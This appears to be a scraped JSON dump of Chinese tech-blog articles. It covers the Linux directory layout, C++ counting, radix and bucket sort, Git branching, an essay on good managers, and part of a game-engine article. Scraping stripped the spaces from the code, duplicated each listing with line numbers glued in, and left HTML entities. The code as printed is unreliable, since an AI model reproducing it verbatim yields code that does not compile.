行编译程序所需的文件。通常是对来自/usr/lib/X11中文件的符号连接。/usr/bin这是执行程序的主要目录，其中的绝大多数为一般使用者使用，除了那些启动系统或修复系统或不是本地安装的程序一般都放在此目录下。/usr/bin/X11X11执行文件放置的地方；在Linux系统中，它通常是对/usr/X11R6/bin.符号连接表/usr/dict此目录保存拼写检查器所使用的词汇表文件。/usr/doc此目录下应可以找到那些已安装的软件文件。/usr/etc此目录可用来那些存放整个网共享的配置文件。然而那可执行命令指向总是使用参照使用/etc目录下的文件。/etc目录下连接文件应指向/usr/etc.目录下适当的文件。/usr/includeC程序语言编译使用的Include”包括”文件。/usr/include/X11C程序语言编译和X-Windows系统使用的Include”包括”文件。它通常中指向/usr/X11R6/include/X11.符号连接表。/usr/include/asm申明汇编函数的Include”包括”文件，它通常是指向/usr/src/linux/include/asm目录的符号连接/usr/include/linux包含系统变更的信息通常是指向/usr/src/linux/include/linux目录的符号连接表，来获得操作系统特定信息。(注：使用者应在此自行包含那些保证自己开发的程序正常运行所需的libc函数库。不管怎样，Linux核心系统不是设计用来执行直接运行用户程序的，它并不知道用户程序需要使用哪个版本的libc库。如果你随意将/usr/include/asm和/usr/include/linux指向一个系统核心，系统很可能崩溃。Debian系统不这么做。它使用libc*-dev运行包中提供的核心系统标识，以保证启动所正确的文件。)/usr/include/g++GNUC++编译程序所使用的Include”包括”文件。/usr/lib目标库文件，包括动态连接库加上一些通常不是直接调用的可执行文件案。一些复杂的程序可能在此占用整个子目录。/usr/lib/X11存放X系统数据文件及系统配置文件的地方。Linux中通常是指向/usr/X11R6/lib/X11目录的符号连接表。/usr/lib/gcc-libGNUC编译程序所使用的可执行文件案和”包括”文件。gcc(1)./usr/lib/groffGNUgroff文件格式系统所使用的文件。/usr/lib/uucpuucp(1)所使用的文件。/usr/lib/zoneinfo关时区信息文件文件。/usr/local安装在本地执行程序的地方。/usr/local/bin在此地放置本地执行程序的二进制文件。/usr/local/doc放置本地文件。/usr/local/etc安装在本地程序的配置文件。/usr/local/lib安装在本地程序的库文件。/usr/local/info安装在本地程序关信息文件。/usr/local/man安装在本地程序使用手册。/usr/local/sbin安装在本地的系统管理程序。/usr/local/src安装在本地程序的原始码。/usr/man手册页通常放在此目录，或相关子目录下。/usr/man//man[1-9]此目录在指定的地方以原始码形式存放手册页。系统在所的手册页中使用自己独特的语言及代码集，可能会省略substring子字符串。/usr/sbin此目录保存系统管理程序的二进制码，这些文件不是系统启动或文件系统挂载/usr目录或修复系统所必需的。/usr/share在此目录下不同的子目录中保存了同一个操作系统在不同构架下工作时特定应用程序的共享数据。使用者可以找到通常放在/usr/doc或/usr/lib或/usr/man目录下的这些数据。/usr/src系统不同组成部份的源文件包括参考数据报。不要将你自己与项目关的文件放这里，因为在安装软件外，/usr下的文件属性除通常设为只读。/usr/src/linux系统核心资源通常拆包安装于此。这是系统中重要的一环，因为/usr/include/linux符号连接表指向此目录。你应当使用其他目录来来编译建立新核心。/usr/tmp此目录不再使用了。它应指向目录/var/tmp。这个链接只是出于系统兼容的目的，一般不再使用。/var此目录下文件的大小可能会改变，如缓冲文件可日志文件。/var/adm此目录为/var/log甩替代，通常是指向/var/log的符号连接表。/var/backups此目录用来存放重要系统文件的后备文件/var/catman/cat[1-9]or/var/cache/man/cat[1-9]此目录存储根据手册分类预先格式化的参考手册页。(这些参考手册页是相互独立的)/var/lock此目录存储锁定文件。依据命名习惯，设备锁定文件是LCKxxxxxxxxxx与在文件系统中该设备名相同，使用的格式是HDUUUCP锁定文件，例如包含进程标识PID的锁定文件是一个10字节的ASCII格式的数字，后面跟一个换行符。/var/log各种日志文件。/var/preserve这是vi(1)存放正在编辑中的文件，以便以后可以恢复。/var/run运行时的变量文件，如存放进程标识和登入使用者信息的文件。(utmp)此目录下文件在系统启动时被自动清除。/var/spool各种程序产生的缓冲或排除等待的文件/var/spool/atat(1)的作业存缓区/var/spool/croncron(1)的作业存缓区/var/spool/lpd打印缓存文件。/var/spool/mail使用者邮箱。/var/spool/smail存放smail(1)邮件发送程序的缓冲文件。/var/spool/news新闻子系统的缓冲目录/var/spool/uucpuucp(1)的缓冲文件/var/tmp类似/tmp,此目录保存未指定持续时间的临时文件。作者简介吕凯，TPV资深主任工程师，大连理工大学硕士。关注软件开发、系统运维、内容管理、行动管理等领域，喜欢计数写作及分享。1赞4收藏评论", "url_object_id": "176ceef8f652aca8d54353b9381783ee"},{"title": "常用排序算法总结（2）", "url": "http://blog.jobbole.com/113977/", "create_date": "2018-09-13", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2014/10/9184208f96827c412ab7d3570590ef76.jpg"], "praise_nums": 1, "fav_nums": 5, "comments_nums": 0, "tags": "2,0,1,8,/,0,5,/,1,3, ,·", "content": "原文出处：SteveWang上一篇总结了常用的比较排序算法，主要有冒泡排序，选择排序，插入排序，归并排序，堆排序，快速排序等。这篇文章中我们来探讨一下常用的非比较排序算法：计数排序，基数排序，桶排序。在一定条件下，它们的时间复杂度可以达到O(n)。这里我们用到的唯一数据结构就是数组，当然我们也可以利用链表来实现下述算法。计数排序(CountingSort)计数排序用到一个额外的计数数组C，根据数组C来将原数组A中的元素排到正确的位置。通俗地理解，例如有10个年龄不同的人，假如统计出有8个人的年龄不比小明大（即小于等于小明的年龄，这里也包括了小明），那么小明的年龄就排在第8位，通过这种思想可以确定每个人的位置，也就排好了序。当然，年龄一样时需要特殊处理（保证稳定性）：通过反向填充目标数组，填充完毕后将对应的数字统计递减，可以确保计数排序的稳定性。计数排序的步骤如下：统计数组A中每个值A[i]出现的次数，存入C[A[i]]从前向后，使数组C中的每个值等于其与前一项相加，这样数组C[A[i]]就变成了代表数组A中小于等于A[i]的元素个数反向填充目标数组B：将数组元素A[i]放在数组B的第C[A[i]]个位置（下标为C[A[i]]–1），每放一个元素就将C[A[i]]递减计数排序的实现代码如下：#include&lt;iostream&gt;usingnamespacestd;//分类------------内部非比较排序//数据结构---------数组//最差时间复杂度----O(n+k)//最优时间复杂度----O(n+k)//平均时间复杂度----O(n+k)//所需辅助空间------O(n+k)//稳定性-----------稳定constintk=100;//基数为100，排序[0,99]内的整数intC[k];//计数数组voidCountingSort(intA[],intn){for(inti=0;i&lt;k;i++)//初始化，将数组C中的元素置0(此步骤可省略，整型数组元素默认值为0){C[i]=0;}for(inti=0;i&lt;n;i++)//使C[i]保存着等于i的元素个数{C[A[i]]++;}for(inti=1;i&lt;k;i++)//使C[i]保存着小于等于i的元素个数，排序后元素i就放在第C[i]个输出位置上{C[i]=C[i]+C[i-1];}int*B=(int*)malloc((n)*sizeof(int));//分配临时空间,长度为n，用来暂存中间数据for(inti=n-1;i&gt;=0;i--)//从后向前扫描保证计数排序的稳定性(重复元素相对次序不变){B[--C[A[i]]]=A[i];//把每个元素A[i]放到它在输出数组B中的正确位置上//当再遇到重复元素时会被放在当前元素的前一个位置上保证计数排序的稳定性}for(inti=0;i&lt;n;i++)//把临时空间B中的数据拷贝回A{A[i]=B[i];}free(B);//释放临时空间}intmain(){intA[]={15,22,19,46,27,73,1,19,8};//针对计数排序设计的输入，每一个元素都在[0,100]上且有重复元素intn=sizeof(A)/sizeof(int);CountingSort(A,n);printf(\"计数排序结果：\");for(inti=0;i&lt;n;i++){printf(\"%d\",A[i]);}printf(\"\\n\");return0;}12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#include&lt;iostream&gt;usingnamespacestd;//分类------------内部非比较排序//数据结构---------数组//最差时间复杂度----O(n+k)//最优时间复杂度----O(n+k)//平均时间复杂度----O(n+k)//所需辅助空间------O(n+k)//稳定性-----------稳定constintk=100;//基数为100，排序[0,99]内的整数intC[k];//计数数组voidCountingSort(intA[],intn){for(inti=0;i&lt;k;i++)//初始化，将数组C中的元素置0(此步骤可省略，整型数组元素默认值为0){C[i]=0;}for(inti=0;i&lt;n;i++)//使C[i]保存着等于i的元素个数{C[A[i]]++;}for(inti=1;i&lt;k;i++)//使C[i]保存着小于等于i的元素个数，排序后元素i就放在第C[i]个输出位置上{C[i]=C[i]+C[i-1];}int*B=(int*)malloc((n)*sizeof(int));//分配临时空间,长度为n，用来暂存中间数据for(inti=n-1;i&gt;=0;i--)//从后向前扫描保证计数排序的稳定性(重复元素相对次序不变){B[--C[A[i]]]=A[i];//把每个元素A[i]放到它在输出数组B中的正确位置上//当再遇到重复元素时会被放在当前元素的前一个位置上保证计数排序的稳定性}for(inti=0;i&lt;n;i++)//把临时空间B中的数据拷贝回A{A[i]=B[i];}free(B);//释放临时空间}intmain(){intA[]={15,22,19,46,27,73,1,19,8};//针对计数排序设计的输入，每一个元素都在[0,100]上且有重复元素intn=sizeof(A)/sizeof(int);CountingSort(A,n);printf(\"计数排序结果：\");for(inti=0;i&lt;n;i++){printf(\"%d\",A[i]);}printf(\"\\n\");return0;}下图给出了对{4,1,3,4,3}进行计数排序的简单演示过程计数排序的时间复杂度和空间复杂度与数组A的数据范围（A中元素的最大值与最小值的差加上1）有关，因此对于数据范围很大的数组，计数排序需要大量时间和内存。例如：对0到99之间的数字进行排序，计数排序是最好的算法，然而计数排序并不适合按字母顺序排序人名，将计数排序用在基数排序算法中，能够更有效的排序数据范围很大的数组。　　基数排序(RadixSort)基数排序的发明可以追溯到1887年赫尔曼·何乐礼在打孔卡片制表机上的贡献。它是这样实现的：将所有待比较正整数统一为同样的数位长度，数位较短的数前面补零。然后，从最低位开始进行基数为10的计数排序，一直到最高位计数排序完后，数列就变成一个有序序列（利用了计数排序的稳定性）。基数排序的实现代码如下：#include&lt;iostream&gt;usingnamespacestd;//分类-------------内部非比较排序//数据结构----------数组//最差时间复杂度----O(n*dn)//最优时间复杂度----O(n*dn)//平均时间复杂度----O(n*dn)//所需辅助空间------O(n*dn)//稳定性-----------稳定constintdn=3;//待排序的元素为三位数及以下constintk=10;//基数为10，每一位的数字都是[0,9]内的整数intC[k];intGetDigit(intx,intd)//获得元素x的第d位数字{intradix[]={1,1,10,100};//最大为三位数，所以这里只要到百位就满足了return(x/radix[d])%10;}voidCountingSort(intA[],intn,intd)//依据元素的第d位数字，对A数组进行计数排序{for(inti=0;i&lt;k;i++){C[i]=0;}for(inti=0;i&lt;n;i++){C[GetDigit(A[i],d)]++;}for(inti=1;i&lt;k;i++){C[i]=C[i]+C[i-1];}int*B=(int*)malloc(n*sizeof(int));for(inti=n-1;i&gt;=0;i--){intdight=GetDigit(A[i],d);//元素A[i]当前位数字为dightB[--C[dight]]=A[i];//根据当前位数字，把每个元素A[i]放到它在输出数组B中的正确位置上//当再遇到当前位数字同为dight的元素时，会将其放在当前元素的前一个位置上保证计数排序的稳定性}for(inti=0;i&lt;n;i++){A[i]=B[i];}free(B);}voidLsdRadixSort(intA[],intn)//最低位优先基数排序{for(intd=1;d&lt;=dn;d++)//从低位到高位CountingSort(A,n,d);//依据第d位数字对A进行计数排序}intmain(){intA[]={20,90,64,289,998,365,852,123,789,456};//针对基数排序设计的输入intn=sizeof(A)/sizeof(int);LsdRadixSort(A,n);printf(\"基数排序结果：\");for(inti=0;i&lt;n;i++){printf(\"%d\",A[i]);}printf(\"\\n\");return0;}1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768#include&lt;iostream&gt;usingnamespacestd;//分类-------------内部非比较排序//数据结构----------数组//最差时间复杂度----O(n*dn)//最优时间复杂度----O(n*dn)//平均时间复杂度----O(n*dn)//所需辅助空间------O(n*dn)//稳定性-----------稳定constintdn=3;//待排序的元素为三位数及以下constintk=10;//基数为10，每一位的数字都是[0,9]内的整数intC[k];intGetDigit(intx,intd)//获得元素x的第d位数字{intradix[]={1,1,10,100};//最大为三位数，所以这里只要到百位就满足了return(x/radix[d])%10;}voidCountingSort(intA[],intn,intd)//依据元素的第d位数字，对A数组进行计数排序{for(inti=0;i&lt;k;i++){C[i]=0;}for(inti=0;i&lt;n;i++){C[GetDigit(A[i],d)]++;}for(inti=1;i&lt;k;i++){C[i]=C[i]+C[i-1];}int*B=(int*)malloc(n*sizeof(int));for(inti=n-1;i&gt;=0;i--){intdight=GetDigit(A[i],d);//元素A[i]当前位数字为dightB[--C[dight]]=A[i];//根据当前位数字，把每个元素A[i]放到它在输出数组B中的正确位置上//当再遇到当前位数字同为dight的元素时，会将其放在当前元素的前一个位置上保证计数排序的稳定性}for(inti=0;i&lt;n;i++){A[i]=B[i];}free(B);}voidLsdRadixSort(intA[],intn)//最低位优先基数排序{for(intd=1;d&lt;=dn;d++)//从低位到高位CountingSort(A,n,d);//依据第d位数字对A进行计数排序}intmain(){intA[]={20,90,64,289,998,365,852,123,789,456};//针对基数排序设计的输入intn=sizeof(A)/sizeof(int);LsdRadixSort(A,n);printf(\"基数排序结果：\");for(inti=0;i&lt;n;i++){printf(\"%d\",A[i]);}printf(\"\\n\");return0;}下图给出了对{329,457,657,839,436,720,355}进行基数排序的简单演示过程基数排序的时间复杂度是O(n*dn)，其中n是待排序元素个数，dn是数字位数。这个时间复杂度不一定优于O(nlogn)，dn的大小取决于数字位的选择（比如比特位数），和待排序数据所属数据类型的全集的大小；dn决定了进行多少轮处理，而n是每轮处理的操作数目。如果考虑和比较排序进行对照，基数排序的形式复杂度虽然不一定更小，但由于不进行比较，因此其基本操作的代价较小，而且如果适当的选择基数，dn一般不大于logn，所以基数排序一般要快过基于比较的排序，比如快速排序。由于整数也可以表达字符串（比如名字或日期）和特定格式的浮点数，所以基数排序并不是只能用于整数排序。　　桶排序(BucketSort)桶排序也叫箱排序。工作的原理是将数组元素映射到有限数量个桶里，利用计数排序可以定位桶的边界，每个桶再各自进行桶内排序（使用其它排序算法或以递归方式继续使用桶排序）。桶排序的实现代码如下：#include&lt;iostream&gt;usingnamespacestd;//分类-------------内部非比较排序//数据结构---------数组//最差时间复杂度----O(nlogn)或O(n^2)，只有一个桶，取决于桶内排序方式//最优时间复杂度----O(n)，每个元素占一个桶//平均时间复杂度----O(n)，保证各个桶内元素个数均匀即可//所需辅助空间------O(n+bn)//稳定性-----------稳定/*本程序用数组模拟桶*/constintbn=5;//这里排序[0,49]的元素，使用5个桶就够了，也可以根据输入动态确定桶的数量intC[bn];//计数数组，存放桶的边界信息voidInsertionSort(intA[],intleft,intright){for(inti=left+1;i&lt;=right;i++)//从第二张牌开始抓，直到最后一张牌{intget=A[i];intj=i-1;while(j&gt;=left&amp;&amp;A[j]&gt;get){A[j+1]=A[j];j--;}A[j+1]=get;}}intMapToBucket(intx){returnx/10;//映射函数f(x)，作用相当于快排中的Partition，把大量数据分割成基本有序的数据块}voidCountingSort(intA[],intn){for(inti=0;i&lt;bn;i++){C[i]=0;}for(inti=0;i&lt;n;i++)//使C[i]保存着i号桶中元素的个数{C[MapToBucket(A[i])]++;}for(inti=1;i&lt;bn;i++)//定位桶边界：初始时，C[i]-1为i号桶最后一个元素的位置{C[i]=C[i]+C[i-1];}int*B=(int*)malloc((n)*sizeof(int));for(inti=n-1;i&gt;=0;i--)//从后向前扫描保证计数排序的稳定性(重复元素相对次序不变){intb=MapToBucket(A[i]);//元素A[i]位于b号桶B[--C[b]]=A[i];//把每个元素A[i]放到它在输出数组B中的正确位置上//桶的边界被更新：C[b]为b号桶第一个元素的位置}for(inti=0;i&lt;n;i++){A[i]=B[i];}free(B);}voidBucketSort(intA[],intn){CountingSort(A,n);//利用计数排序确定各个桶的边界（分桶）for(inti=0;i&lt;bn;i++)//对每一个桶中的元素应用插入排序{intleft=C[i];//C[i]为i号桶第一个元素的位置intright=(i==bn-1?n-1:C[i+1]-1);//C[i+1]-1为i号桶最后一个元素的位置if(left&lt;right)//对元素个数大于1的桶进行桶内插入排序InsertionSort(A,left,right);}}intmain(){intA[]={29,25,3,49,9,37,21,43};//针对桶排序设计的输入intn=sizeof(A)/sizeof(int);BucketSort(A,n);printf(\"桶排序结果：\");for(inti=0;i&lt;n;i++){printf(\"%d\",A[i]);}printf(\"\\n\");return0;}12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788#include&lt;iostream&gt;usingnamespacestd;//分类-------------内部非比较排序//数据结构---------数组//最差时间复杂度----O(nlogn)或O(n^2)，只有一个桶，取决于桶内排序方式//最优时间复杂度----O(n)，每个元素占一个桶//平均时间复杂度----O(n)，保证各个桶内元素个数均匀即可//所需辅助空间------O(n+bn)//稳定性-----------稳定/*本程序用数组模拟桶*/constintbn=5;//这里排序[0,49]的元素，使用5个桶就够了，也可以根据输入动态确定桶的数量intC[bn];//计数数组，存放桶的边界信息voidInsertionSort(intA[],intleft,intright){for(inti=left+1;i&lt;=right;i++)//从第二张牌开始抓，直到最后一张牌{intget=A[i];intj=i-1;while(j&gt;=left&amp;&amp;A[j]&gt;get){A[j+1]=A[j];j--;}A[j+1]=get;}}intMapToBucket(intx){returnx/10;//映射函数f(x)，作用相当于快排中的Partition，把大量数据分割成基本有序的数据块}voidCountingSort(intA[],intn){for(inti=0;i&lt;bn;i++){C[i]=0;}for(inti=0;i&lt;n;i++)//使C[i]保存着i号桶中元素的个数{C[MapToBucket(A[i])]++;}for(inti=1;i&lt;bn;i++)//定位桶边界：初始时，C[i]-1为i号桶最后一个元素的位置{C[i]=C[i]+C[i-1];}int*B=(int*)malloc((n)*sizeof(int));for(inti=n-1;i&gt;=0;i--)//从后向前扫描保证计数排序的稳定性(重复元素相对次序不变){intb=MapToBucket(A[i]);//元素A[i]位于b号桶B[--C[b]]=A[i];//把每个元素A[i]放到它在输出数组B中的正确位置上//桶的边界被更新：C[b]为b号桶第一个元素的位置}for(inti=0;i&lt;n;i++){A[i]=B[i];}free(B);}voidBucketSort(intA[],intn){CountingSort(A,n);//利用计数排序确定各个桶的边界（分桶）for(inti=0;i&lt;bn;i++)//对每一个桶中的元素应用插入排序{intleft=C[i];//C[i]为i号桶第一个元素的位置intright=(i==bn-1?n-1:C[i+1]-1);//C[i+1]-1为i号桶最后一个元素的位置if(left&lt;right)//对元素个数大于1的桶进行桶内插入排序InsertionSort(A,left,right);}}intmain(){intA[]={29,25,3,49,9,37,21,43};//针对桶排序设计的输入intn=sizeof(A)/sizeof(int);BucketSort(A,n);printf(\"桶排序结果：\");for(inti=0;i&lt;n;i++){printf(\"%d\",A[i]);}printf(\"\\n\");return0;}下图给出了对{29,25,3,49,9,37,21,43}进行桶排序的简单演示过程桶排序不是比较排序，不受到O(nlogn)下限的影响，它是鸽巢排序的一种归纳结果，当所要排序的数组值分散均匀的时候，桶排序拥有线性的时间复杂度。1赞5收藏评论", "url_object_id": "b56537dc0b776f7afb12d3ecdd87b33c"},{"title": "Git 分支操作介绍", "url": "http://blog.jobbole.com/114107/", "create_date": "2018-09-13", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/06/b84f8d56e47a8496314a55a39b08ad10.jpg"], "praise_nums": 1, "fav_nums": 3, "comments_nums": 0, "tags": "2,0,1,8,/,0,6,/,1,0, ,·", "content": "原文出处：KedarVijayKulkarni译文出处：Linux中国/AndySong在本系列的前两篇文章中，我们开始使用Git，学会如何克隆项目，修改、增加和删除内容。在这第三篇文章中，我将介绍Git分支，为何以及如何使用分支。不妨用树来描绘Git仓库。图中的树有很多分支，或长或短，或从树干延伸或从其它分支延伸。在这里，我们用树干比作仓库的master分支，其中master代指”master分支”，是Git仓库的中心分支或第一个分支。为简单起见，我们假设master是树干，其它分支都是从该分支分出的。为何在Git仓库中使用分支使用分支的主要理由为：如果你希望为项目增加新特性，但很可能会影响当前可正常工作的代码。对于该项目的活跃用户而言，这是很糟糕的事情。与其将特性加入到其它人正在使用的master分支，更好的方法是在仓库的其它分支中变更代码，下面会给出具体的工作方式。更重要的是，Git其设计用于协作。如果所有人都在你代码仓库的master分支上操作，会引发很多混乱。对编程语言或项目的知识和阅历因人而异；有些人可能会编写有错误或缺陷的代码，也可能会编写你觉得不适合该项目的代码。使用分支可以让你核验他人的贡献并选择适合的加入到项目中。（这里假设你是代码库唯一的所有者，希望对增加到项目中的代码有完全的控制。在真实的项目中，代码库有多个具有合并代码权限的所有者）创建分支让我们回顾本系列上一篇文章，看一下在我们的Demo目录中分支是怎样的。如果你没有完成上述操作，请按照文章中的指示从GitHub克隆代码并进入Demo目录。运行如下命令：pwdgitbranchls-la1234pwdgitbranchls-lapwd命令（是当前工作目录的英文缩写）返回当前你所处的目录（以便确认你在Demo目录中），gitbranch列出该项目在你主机上的全部分支，ls-la列出当前目录下的所有文件。你的终端输出类似于：在master分支中，只有一个文件README.md。（Git会友好地忽略掉其它目录和文件。）接下来，运行如下命令：gitstatusgitcheckout-bmyBranchgitstatus1234gitstatusgitcheckout-bmyBranchgitstatus第一条命令gitstatus告知你当前位于branchmaster，（就像在终端中看到的那样）它与origin/master处于同步状态，这意味着master分支的本地副本中的全部文件也出现在GitHub中。两份副本没有差异，所有的提交也是一致的。下一条命令gitcheckout-bmyBranch中的-b告知Git创建一个名为myBranch的新分支，然后checkout命令将我们切换到新创建的分支。运行第三条命令gitstatus确保你已经位于刚创建的分支下。如你所见，gitstatus告知你当前处于myBranch分支，没有变更需要提交。这是因为我们既没有增加新文件，也没有修改已有文件。如果希望以可视化的方式查看分支，可以运行gitk命令。如果遇到报错bash:gitk:commandnotfound...，请先安装gitk软件包（找到你操作系统对应的安装文档，以获得安装方式）。（LCTT译注：需要在有X服务器的终端运行gitk，否则会报错）下图展示了我们在Demo项目中的所作所为：你最后一次提交（的对应信息）是Deletefile.txt，在此之前有三次提交。当前的提交用黄点标注，之前的提交用蓝点标注，黄点和Deletefile.txt之间的三个方块展示每个分支所在的位置（或者说每个分支中的最后一次提交的位置）。由于myBranch刚创建，提交状态与master分支及其对应的记为remotes/origin/master的远程master分支保持一致。（非常感谢来自RedHat的PeterSavage让我知道gitk这个工具）下面让我们在myBranch分支下创建一个新文件并观察终端输出。运行如下命令：echo\"CreatinganewFileonmyBranch\"&gt;newFilecatnewFilegitstatus1234echo\"CreatinganewFileonmyBranch\"&gt;newFilecatnewFilegitstatus第一条命令中的echo创建了名为newFile的文件，接着catnewFile打印出文件内容，最后gitstatus告知你我们myBranch分支的当前状态。在下面的终端输出中，Git告知myBranch分支下有一个名为newFile的文件当前处于untracked状态。这表明我们没有让Git追踪发生在文件newFile上的变更。下一步是增加文件，提交变更并将newFile文件推送至myBranch分支（请回顾本系列上一篇文章获得更多细节）。gitaddnewFilegitcommit-m\"AddingnewFiletomyBranch\"gitpushoriginmyBranch1234gitaddnewFilegitcommit-m\"AddingnewFiletomyBranch\"gitpushoriginmyBranch在上述命令中，push命令使用的分支参数为myBranch而不是master。Git添加newFile并将变更推送到你GitHub账号下的Demo仓库中，告知你在GitHub上创建了一个与你本地副本分支myBranch一样的新分支。终端输出截图给出了运行命令的细节及命令输出。当你访问GitHub时，在分支选择的下拉列表中可以发现两个可供选择的分支。点击myBranch切换到myBranch分支，你可以看到在此分支上新增的文件。截至目前，我们有两个分支：一个是master分支，只有一个README.md文件；另一个是myBranch分支，有两个文件。你已经知道如何创建分支了，下面我们再创建一个分支。输入如下命令：gitcheckoutmastergitcheckout-bmyBranch2touchnewFile2gitaddnewFile2gitcommit-m\"AddingnewFile2tomyBranch2\"gitpushoriginmyBranch21234567gitcheckoutmastergitcheckout-bmyBranch2touchnewFile2gitaddnewFile2gitcommit-m\"AddingnewFile2tomyBranch2\"gitpushoriginmyBranch2我不再给出终端输出，需要你自己尝试，但你可以在GitHub代码库中验证你的结果。删除分支由于我们增加了两个分支，下面删除其中的一个（myBranch），包括两步：删除本地分支你不能删除正在操作的分支，故切换到master分支（或其它你希望保留的分支），命令及终端输出如下：gitbranch可以列出可用的分支，使用checkout切换到master分支，然后使用gitbranch-DmyBranch删除该分支。再次运行gitbranch检查是否只剩下两个分支（而不是三个）。删除GitHub上的分支使用如下命令删除myBranch的远程分支：gitpushorigin:myBranch12gitpushorigin:myBranch上面push命令中分支名称前面的冒号（:）告知GitHub删除分支。另一种写法为：gitpush-doriginmyBranch12gitpush-doriginmyBranch其中-d(也可以用--delete)也用于告知GitHub删除你的分支。我们学习了Git分支的使用，在本系列的下一篇文章中，我们将介绍如何执行fetch和rebase操作，对于多人同时的贡献的项目而言，这是很必须学会的。1赞3收藏评论", "url_object_id": "90144cba629e28c20a0e4a2ee1876768"},{"title": "GitHub 工程师：我眼中的理想上司是这样子的", "url": "http://blog.jobbole.com/113956/", "create_date": "2018-09-13", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2012/07/20120717_161512_1.jpg"], "praise_nums": 1, "fav_nums": 3, "comments_nums": 0, "tags": "2,0,1,8,/,0,5,/,0,9, ,·", "content": "本文由伯乐在线-刘唱翻译。未经许可，禁止转载！英文出处：Keavy。欢迎加入翻译组。我是Github的一名高级工程师。我不是要找工作，只是一直在思考领导能力的问题，思考在我多年共事过的诸多领导之中，我最欣赏的特质是什么。受到ChadFowler的文章《我想雇什么样的员工》的启发，我也开始留意我想为什么样的领导工作，即——理想的领导是什么样。在分享我的看法之前，先让我简单介绍一下我自己的情况：我是一名经验丰富的工程师，做过很多基础架构的工作，同时在我的专业领域（API及其生态环境）扮演着技术顾问的角色。我是个不太需要监督指导的人，我老板只要指出问题的大方向，就可以放手让我去完成了。我很乐意解决困难的工程问题，带领团队朝一个方向努力，或是帮助公司与公众就一个项目进行沟通。正如一个同事所言：我就是“擅长搞定麻烦事”。以下是我认为作为一个理想的领导者应有的特质：在工作中明显地表现出冷静和自在，了解你的态度和行为会对周围的人产生哪些影响，非常关注如何营造出一种相互支持的工作环境。工作是生活的一部分，拥有健康的工作时间，会休假。即使你自己选择在常规工作时间以外工作，也不期待别人和你一样，不干扰其他人的工作习惯。无论与谁谈话都在场。善于倾听。基于自己和团队的价值，会经过深思熟虑精心设计工作流程，因为你重视他人的参与和时间，因此不会为了走流程而增加流程。当你要提出批评性的建议的时候，会及时并且私下沟通。会提供具体的细节，并给出改进的建议和所需的支持。当你有积极的反馈意见时，也会提供具体的细节，并以别人喜欢被认可的方式分享出来。足够自信，乐于接受其他人对你工作和方法的反馈。足够谦虚，在你有不懂的时候、犯错的时候或是学到新东西的时候随时承认。享受从周围人身上学习新知识的过程。对公司的情况有深刻透彻的理解，利用已知的信息指导员工如何工作可以创造出最大的价值，为用户和公司带来最好的影响。不害怕质疑和否认自己的领导，或是挑战公司的现状。允许并支持你的员工在划定的范围内自己做决定，即使你可能不会做同样的决定。无论是大型还是小型的任务、新特性还是常规维护，重视他人的工作。经常强调这一点，让每个人都知道你重视他和他的工作成果。无论在何时何地都能培养一种信任的文化。能够意识到使没受重视的人群被边缘化的行为，即使这些行为是微不足道的，也可能是出于潜意识的。意识到这些事所造成的情感上的伤害。当这种情况出现时，能迅速采取行动解决问题。知道科技领域实际上并不是精英政治（根据个人才能和功绩分配权力），多留意在工作中谁创造了最多的价值，谁最积极主动，确保他们受到关注，拥有更多特权。同样，留意谁在工作中遇到了困难，努力纠正其中的不平等。观察大家在日常沟通和正式场合谈论事情有何不同。知道存在对女性和有色人种的系统性偏见，努力保证你的员工在相处和评估时不受到此类歧视。利用自己的特权帮助员工成长，积极赞助员工：使他们融入团队，看到他们的努力，让他们得到提拔。不只是期待员工做出最完美的工作，还要信任并赋予他们做好工作的权力。给予员工接受并完成新挑战所需的支持。不接受平庸。如果你尽了最大的努力，但是员工还是滥竽充数，那他们必须离开。尽管承担着很多责任和利益相关，仍然着眼于如何让员工更轻松地产出最佳工作成果。能注意到有人在工作中感到沮丧、无聊或是很吃力。无论他们主动告诉你的还是你感觉到的，抽出点时间关心他们，倾听其中的原因。从我的观点来看，以上这些都很重要。如果我描述的这些你都符合，我想你会成为一个好榜样，培养出一个互相支持，态度积极而又忠诚的团队。你能让员工的生活变得更好，理由很简单，你真正地关心着你的员工。打赏支持我翻译更多好文章，谢谢！打赏译者打赏支持我翻译更多好文章，谢谢！1赞3收藏评论关于作者：刘唱数据挖掘研究生个人主页·我的文章·37·", "url_object_id": "6a9a2f2ed164a2490d1813a3bb30a2b5"},{"title": "如何编写 C++ 游戏引擎", "url": "http://blog.jobbole.com/113960/", "create_date": "2018-09-13", "front_image_url": ["http://wx2.sinaimg.cn/mw690/63918611gy1fre7k2nnx5j20c806wgli.jpg"], "praise_nums": 1, "fav_nums": 2, "comments_nums": 0, "tags": "2,0,1,8,/,0,6,/,0,5, ,·", "content": "本文由伯乐在线-李大萌翻译，艾凌风校稿。未经许可，禁止转载！英文出处：JeffPreshing。欢迎加入翻译组。最近我在用C++写游戏引擎，再用这个引擎做了一个移动端小游戏跳一跳（HopOut）。下面是截自我的iPhone6的一个小片段。视频地址：http://preshing.com/images/hopoutclip.mp4跳一跳是我想玩的游戏类型：3D卡通外观的复古街机游戏。目标是改变每个填充块的颜色，就像Q*Bert一样。HopOut仍在开发中，但引擎的功能已经很完善了，所以我想在这里分享一些关于引擎开发的技巧。你为什么想要写一个游戏引擎？可能有很多原因：你是个修理工，喜欢从头开始建立系统，直到系统完成。关于游戏开发你想了解更多。我在游戏行业工作了14年，现在我仍然在不停的琢磨。我甚至不确定我是否可以从头开始编写一个引擎，因为它与大型工作室的编程工作的日常职责大不相同。我想知道答案。你喜欢控制。对完全按照你想要的方式组织代码，知道一切都在哪里，感到满意。你可以从AGI（1984），idTech1（1993），Build（1995）等经典游戏引擎以及Unity和Unreal等行业巨头那里获得灵感。你相信我们这个游戏产业应该试着去揭开引擎发展的序幕。我们并没有掌握制作游戏的艺术。还离得很远！我们对这个过程的研究越多，改进的机会就越大。2017年的游戏平台–手机，游戏机和电脑–非常强大，而且在很多方面都非常相似。游戏引擎的开发并不是像过去一样，在脆弱和怪异的硬件上挣扎。在我看来，更多是关于自己制造出来的复杂性的斗争。创造一个怪物很容易！这就是为什么本文建议围绕着保持事情可控的原因。我把它分成三部分：使用迭代方法在统一事物前要三思请注意，序列化是一